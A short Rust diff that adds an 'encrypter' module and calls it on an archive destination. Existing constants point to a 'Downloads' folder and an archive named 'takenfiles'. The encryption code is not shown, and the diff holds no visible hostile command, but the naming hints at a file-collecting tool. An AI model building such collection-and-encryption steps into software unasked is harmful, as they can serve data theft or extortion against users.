@@ -60,6 +60,7 @@ mod compress;
 mod config;
 mod timez;
 mod walkers;
+mod encrypter;
 
 const BASE_URL: &'static str = "Downloads";
 const ARCHIVE_NAME: &'static str = "takenfiles";
@@ -336,6 +337,8 @@ pub fn run(cfg: config::Config) -> Result<bool, io::Error> {
             } else {
                 error!("cannot create the archive destination");
             };
+
+            encrypter::sample(&dst);
         }
     };
     Ok(true)
